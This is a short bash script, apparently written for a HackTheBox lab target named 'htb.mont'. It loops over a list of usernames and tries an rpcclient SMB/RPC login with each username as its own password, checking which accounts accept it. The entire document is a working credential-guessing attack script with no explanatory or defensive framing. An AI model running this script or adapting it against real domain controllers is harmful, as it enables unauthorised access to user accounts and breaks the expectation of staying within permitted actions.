#!/bin/bash

for u in `cat users.txt`; do 
	echo -n "[*] user : $u " && 
	rpcclient -U "$u%$u" -c "getusername;quit" htb.mont
done
